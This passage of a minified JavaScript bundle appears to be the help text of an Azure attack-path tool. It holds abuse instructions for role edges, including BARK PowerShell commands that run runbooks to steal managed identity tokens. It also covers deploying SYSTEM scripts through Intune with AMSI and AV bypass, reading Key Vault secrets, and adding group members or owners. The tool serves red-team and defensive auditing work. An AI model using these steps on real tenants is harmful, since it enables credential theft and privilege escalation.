new credential is created for a service principal."}),Lo=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",children:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/"})}),Fo={general:No,abuse:Go,opsec:Mo,references:Lo},_o=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK's New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput functions to execute arbitrary commands against the target Automation Account."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to add or modify and run Automation Account run books. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken ` \n    -RefreshToken "0.ARwA6WgJJ9X2qk…" ` \n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can use BARK's New-AzureAutomationAccountRunBook function to add a new runbook to the target Automation Account, specifying a command to execute using the -Script parameter:"}),e.jsx(t,{component:"pre",children:'New-AzureAutomationAccountRunBook `\n    -Token $ARMToken `\n    -RunBookName "MyCoolRunBook" `\n    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `\n    -Script "whoami"'}),e.jsx(t,{variant:"body2",children:"After adding the new runbook, you must execute it and fetch its output. You can do this automatically with BARK's Get-AzureAutomationAccountRunBookOutput function:"}),e.jsx(t,{component:"pre",children:'Get-AzureAutomationAccountRunBookOutput `\n    -Token $ARMToken `\n    -RunBookName "MyCoolRunBook" `\n    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'}),e.jsx(t,{variant:"body2",children:"If the Automation Account has a managed identity assignment, you can use these two functions to retrieve a JWT for the service principal like this:"}),e.jsx(t,{component:"pre",children:`$Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token
New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script
Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"`}),e.jsx(t,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),Uo=()=>e.jsx(t,{variant:"body2",children:"The Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account."}),Wo=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Bo=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a",children:"Andy Robbins - Managed Identity Attack Paths, Part 1: Automation Accounts"})]}),qo={general:Uo,abuse:_o,opsec:Wo,references:Bo},Ko=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The Avere Contributor role allows you to run SYSTEM commands on the VM"}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),zo=()=>e.jsx(t,{variant:"body2",children:"Any principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM."}),Ho=()=>e.jsx(t,{variant:"body2",children:"Because you‘ll be running a command as the SYSTEM user on the Virtual Machine, the same opsec considerations for running malicious commands on any system should be taken into account: command line logging, PowerShell script block logging, EDR, etc."}),Vo=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/tactics/TA0008/",children:"ATT&CK T0008: Lateral Movement"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1021/",children:"ATT&CK T1021: Remote Services"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#avere-contributor",children:"Microsoft Docs - Avere Contributor"})]}),Yo={general:zo,abuse:Ko,opsec:Ho,references:Vo},Qo=()=>e.jsx(t,{variant:"body2",children:"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."}),Jo=()=>e.jsx(t,{variant:"body2",children:"Principals with the Cloud App Admin role can control tenant-resident apps"}),Xo=()=>e.jsx(t,{variant:"body2",children:"Auzre will create a log event whenever a new secret is created for a service principal."}),Zo=()=>e.jsx(t,{variant:"body2",children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",children:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/"})}),ei={general:Jo,abuse:Qo,opsec:Xo,references:Zo},ti=()=>e.jsx(t,{variant:"body2",children:"There is no abuse necessary, but any roles scoped on a parent object will descend down to all child objects."}),ri=()=>e.jsx(t,{variant:"body2",children:'This indicates that the parent object contains the child object, such as a resource group containing a virtual machine, or a tenant "containing" a subscription.'}),ni=()=>e.jsx(t,{variant:"body2",children:"This depends on what you do, see other edges as far as opsec considerations for activating roles"}),ai=()=>e.jsx(t,{variant:"body2",children:"No References Available"}),oi={general:ri,abuse:ti,opsec:ni,references:ai},ii=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This depends on what the target object is:"}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Key Vault"}),": You can read secrets and alter access policies (grant yourself access to read secrets)"]}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Automation Account"}),": You can create a new runbook that runs as the Automation Account, and edit existing runbooks. Runbooks can be used to authenticate as the Automation Account and abuse privileges held by the Automation Account. If the Automation Account is using a 'RunAs' account, you can gather the certificate used to login and impersonate that account."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Virtual Machine"}),": Run SYSTEM commands on the VM"]}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Resource Group"}),": NOT abusable, and not collected by AzureHound"]}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunascertificate",children:"Get-AzureRunAsCertificate"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunbookcontent",children:"Get-AzureRunbookContent"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),si=()=>e.jsx(t,{variant:"body2",children:"The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound."}),ci=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),li=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsxs(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/ ",children:["https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"," "]}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/get-azurepasswords/",children:"https://blog.netspi.com/get-azurepasswords/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})]}),di={general:si,abuse:ii,opsec:ci,references:li},hi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"First, have your PowerShell script ready to go and save it somewhere as a PS1 file. Take all the necessary operational security (opsec) and AMSI-bypass steps you want at this point, keeping in mind the script will run as the SYSTEM user unless you specify otherwise. Also keep in mind that the script will be written to disk, so take whatever AV bypass measures you need as well."}),e.jsxs(t,{variant:"body2",children:["Next, log into the Azure web portal as the user with the “Intune Administrator” role activated. After authenticating, access Endpoint Manager at"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://endpoint.microsoft.com",children:"https://endpoint.microsoft.com"})]}),e.jsx(t,{variant:"body2",children:"Click on “Devices” on the left, which takes you, unsurprisingly, to the devices overview. Click on “Scripts” under the “Policy” section to go to the scripts management page. Click “Add,” then click “Windows 10”"}),e.jsx(t,{variant:"body2",children:"This will bring you to the “Add Powershell Script” page. On this first page, you’ll enter a name for the script and a brief description. On the next page, click the folder and then select your PS1 from the common dialogue window. You’ve now got three options to configure, but can leave them all in the default “No” position. Most interestingly, keeping the first selection as “No” will cause the script to run as the SYSTEM user"}),e.jsx(t,{variant:"body2",children:"Click next, and you’ll see the page that lets you scope which systems and users this script will execute for. You can choose to assign the script to “All devices,” “All users,” or “All users and devices.” If you leave the “Assign to” dropdown at its default selection of “Selected groups,” you can scope the script to only execute on systems or for users that belong to certain security groups. The choice is yours: run the script on every possible system or constrain it to only run on certain systems by scoping it to existing security groups or by adding specific devices or users to new security groups."}),e.jsx(t,{variant:"body2",children:"Click “Next” and you’ll see the review page which lets you see what you’re about to do. Click “Add” and Azure will begin registering the script."}),e.jsx(t,{variant:"body2",children:"At this point, the script is now ready to run on your target systems. This process works similarly to Group Policy, in that the Intune agent running on each device periodically checks in (by default every hour) with Intune/Endpoint Manager to see if there is a PowerShell script for it to run, so you will need to wait up to an hour for your target system to actually pull the script down and run it."})]}),pi=()=>e.jsx(t,{variant:"body2",children:"Principals with the Intune Administrators role are able to execute arbitrary PowerShell scripts on devices that are joined to the Azure Active Directory tenant."}),ui=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When the Intune agent pulls down and executes PowerShell scripts, a number of artifacts are created on the endpoint — some permanent and some ephemeral."}),e.jsx(t,{variant:"body2",children:"Two files are created on the endpoint when a PowerShell script is executed in the following locations: - C:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts - C:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Results"}),e.jsx(t,{variant:"body2",children:"The file under the “Scripts” folder will be a local copy of the PS1 stored in Azure, and the file under the “Results” folder will be the output of the PS1; however, both of these files are automatically deleted as soon as the script finishes running."}),e.jsx(t,{variant:"body2",children:"There are also permanent artifacts left over (assuming the attacker doesn’t tamper with them). A full copy of the contents of the PS1 can be found in this log file: - C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\_IntuneManagementExtension.txt"})]}),mi=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/tactics/TA0002/",children:"MITRE: Execution"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d",children:"Death from Above: Lateral Movement from Azure to On-Prem AD"})]}),bi={general:pi,abuse:hi,opsec:ui,references:mi},fi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the certificate from the key vault"}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultcontent"})]}),yi=()=>e.jsx(t,{variant:"body2",children:"The ability to read certificates from key vaults"}),gi=()=>e.jsx(t,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),xi=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent"})]}),ji={general:yi,abuse:fi,opsec:gi,references:xi},wi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the key from the key vault"}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"})]}),vi=()=>e.jsx(t,{variant:"body2",children:"The ability to read keys from key vaults"}),Ai=()=>e.jsx(t,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),Si=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent"})]}),Ci={general:vi,abuse:wi,opsec:Ai,references:Si},ki=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the secret from the key vault"}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"})]}),Ti=()=>e.jsx(t,{variant:"body2",children:"The ability to read secrets from key vaults"}),Pi=()=>e.jsx(t,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),Di=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent"})]}),Oi={general:Ti,abuse:ki,opsec:Pi,references:Di},Ri=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"As a Global Admin, you can change passwords, run commands on VMs, read key vault secrets, activate roles for other users, etc."}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html"}),e.jsx(t,{variant:"body2",children:"For Global Admin to be able to abuse Azure resources, you must first grant yourself the 'User Access Administrator' role in Azure RBAC. This is done through a toggle button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges."}),e.jsx(t,{variant:"body2",children:"Once that role is applied to account, you can then add yourself as an Owner to all subscriptions in the tenant"})]}),Ei=()=>e.jsx(t,{variant:"body2",children:"This edge indicates the principal has the Global Admin role active against the target tenant. In other words, the principal is a Global Admin. Global Admins can do almost anything against almost every object type in the tenant, this is the highest privilege role in Azure."}),Ii=()=>e.jsx(t,{variant:"body2",children:"This depends on exactly what you do, but in general Azure will log each abuse action."}),$i=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})}),Gi={general:Ei,abuse:Ri,opsec:Ii,references:$i},Ni=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse is necessary. This edge only indicates that the principal has been granted a particular AzureAD admin role."})}),Mi=()=>e.jsx(t,{variant:"body2",children:"This edge indicates that a principal has been granted a particular AzureAD admin role."}),Li=()=>e.jsx(t,{variant:"body2",children:"The opsec considerations for a particular action authorized by a principal“s active AzureAD role assignment will wholly depend on what the action taken is. This edge does not capture all abusable possibilities."}),Fi=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/graph/permissions-reference",children:"Microsoft Graph Permission Reference"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/role-based-access-control/overview",children:"Azure role-based access control"})]}),_i={general:Mi,abuse:Ni,opsec:Li,references:Fi},Ui=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can read secrets and alter access policies (grant yourself access to read secrets)"}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"})]}),Wi=()=>e.jsx(t,{variant:"body2",children:"The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault."}),Bi=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),qi=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsxs(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/ ",children:["https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"," "]}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/get-azurepasswords/",children:"https://blog.netspi.com/get-azurepasswords/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})]}),Ki={general:Wi,abuse:Ui,opsec:Bi,references:qi},zi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Currently you need access to the portal GUI to execute this abuse."}),e.jsx(t,{variant:"body2",children:"The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control."}),e.jsx(t,{variant:"body2",children:"You can see a full walkthrough for executing that abuse in this blog post:"}),e.jsx(t,{variant:"body2",children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://medium.com/p/52b29354fc54",children:"Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps"})})]}),Hi=()=>e.jsx(t,{variant:"body2",children:"The Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App."}),Vi=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Yi=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://medium.com/p/52b29354fc54",children:"Managed Identity Attack Paths, Part 2: Logic Apps"})]}),Qi={general:Hi,abuse:zi,opsec:Vi,references:Yi},Ji=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can abuse this privilege using BARK's Add-AZMemberToGroup function."}),e.jsx(t,{variant:"body2",children:"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add principal to the target group. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Then use BARK’s Add-AZMemberToGroup function to add a new principial to the target group:"}),e.jsx(t,{component:"pre",children:'Add-AZMemberToGroup `\n    -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `\n    -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `\n    -Token $MGToken.access_token'}),e.jsx(t,{variant:"body2",children:"Now you can re-authenticate as the principial you just added to the group and continue your attack path, now having whatever privileges the target group has."})]}),Xi=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against non role assignable Azure AD security groups when a Service Principal has one of the following MS Graph app role assignments:"}),e.jsxs(B,{children:[e.jsx(P,{children:e.jsx(M,{children:"Directory.ReadWrite.All"})}),e.jsx(P,{children:e.jsx(M,{children:"Group.ReadWrite.All"})}),e.jsx(P,{children:e.jsx(M,{children:"GroupMember.ReadWrite.All"})})]}),e.jsx(t,{variant:"body2",children:"It is created against all Azure AD security groups, including those that are role assignable, when a Service Principal has the following MS Graph app role:"}),e.jsx(B,{children:e.jsx(P,{children:e.jsx(M,{children:"RoleManagement.ReadWrite.Directory"})})}),e.jsx(t,{variant:"body2",children:"You will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure security group, you will not see that the Service Principal can add members to the group, but it indeed can because of the parallel access management system used by MS Graph."})]}),Zi=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"The Azure activity log for the tenant will log who added what principal to what group, including the date and time."})}),es=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),ts={general:Xi,abuse:Ji,opsec:Zi,references:es},rs=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add a new owner to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"}),e.jsx(t,{component:"pre",children:'New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),e.jsx(t,{variant:"body2",children:"To add a new owner to an App Registration, use BARK's New-AppOwner function:"}),e.jsx(t,{component:"pre",children:'New-AppOwner `\n    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),e.jsx(t,{variant:"body2",children:"To add a new owner to a Group, use BARK's New-GroupOwner function:"}),e.jsx(t,{component:"pre",children:'New-AppOwner `\n    -GroupObjectId "352032bf-161d-4788-b77c-b6f935339770" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'})]}),ns=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when a Service Principal has the following MS Graph app role:"}),e.jsx(t,{variant:"body2",children:e.jsx(B,{children:e.jsx(P,{children:e.jsx(M,{children:"Application.ReadWrite.All"})})})}),e.jsx(t,{variant:"body2",children:"It is also created against all Azure Service Principals when a Service Principal has the following MS Graph app role:"}),e.jsx(t,{variant:"body2",children:e.jsx(B,{children:e.jsx(P,{children:e.jsx(M,{children:"ServicePrincipalEndpoint.ReadWrite.All"})})})}),e.jsx(t,{variant:"body2",children:"It is also created against all Azure security groups that are not role eligible when a Service Principal has one of the following MS Graph app roles:"}),e.jsx(t,{variant:"body2",children:e.jsxs(B,{children:[e.jsx(P,{children:e.jsx(M,{children:"Directory.ReadWrite.All"})}),e.jsx(P,{children:e.jsx(M,{children:"Group.ReadWrite.All"})})]})}),e.jsx(t,{variant:"body2",children:"Finally, it is created against all Azure security groups and all Azure App Registrations when a Service Principal has the following MS Graph app role:"}),e.jsx(t,{variant:"body2",children:e.jsx(B,{children:e.jsx(P,{children:e.jsx(M,{children:"RoleManagement.ReadWrite.Directory"})})})}),e.jsx(t,{variant:"body2",children:"You will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal and the MS Graph API itself."})]}),as=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Any time you add an owner to any Azure object, the AzureAD audit logs will create an event logging who added an owner to what object, as well as what the new owner added to the object was."})}),os=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),is={general:ns,abuse:rs,opsec:as,references:os},ss=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to perform this abuse, depending on 